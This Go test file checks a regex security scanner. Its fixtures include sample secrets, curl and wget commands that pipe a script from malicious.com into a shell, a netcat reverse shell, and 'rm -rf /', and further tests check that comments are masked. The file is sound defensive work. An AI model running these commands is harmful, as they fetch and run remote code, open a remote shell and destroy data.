package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Default to .sh for old tests to maintain behavior
			findings, err := scanner.Scan("test.sh", tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}

func TestRegexScanner_Scan_Masking(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		filename    string
		content     string
		wantFinding string
	}{
		{
			name:        "Shell Comment Masking",
			filename:    "script.sh",
			content:     "# rm -rf /",
			wantFinding: "", // Should be masked
		},
		{
			name:        "Shell Code Detection",
			filename:    "script.sh",
			content:     "rm -rf /",
			wantFinding: "Root Deletion",
		},
		{
			name:        "Go Comment Masking (Line)",
			filename:    "main.go",
			content:     "// rm -rf /",
			wantFinding: "", // Should be masked
		},
		{
			name:        "Go Comment Masking (Block)",
			filename:    "main.go",
			content:     "/* rm -rf / */",
			wantFinding: "", // Should be masked
		},
		{
			name:        "Go Code Detection",
			filename:    "main.go",
			content:     "func main() { /* safe */ } \n // unsafe below \n // exec.Command(\"rm\", \"-rf\", \"/\")",
			wantFinding: "", // Still commented
		},
		{
			name:        "Go String NOT Masked (Code)",
			filename:    "main.go",
			content:     "cmd := `\nrm -rf /\n`", // Backticks not masked, on new line satisfies regex
			wantFinding: "Root Deletion",
		},
		{
			name:        "Mixed Shell in Go (False Positive scenario)",
			filename:    "executor.go",
			content:     "// Executes: rm -rf /",
			wantFinding: "", // Should be masked by C-style masking
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.filename, tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					// Check if any finding is actually related to what we expect to be masked
					// e.g. if we expect NO "Root Deletion" but got one.
					for _, f := range findings {
						if f.Type == "Root Deletion" || f.Type == "Dangerous Command" {
							t.Errorf("Expected no dangerous findings, got %v", f)
						}
					}
				}
			} else {
				found := false
				for _, f := range findings {
					if f.Type == tt.wantFinding {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
				}
			}
		})
	}
}
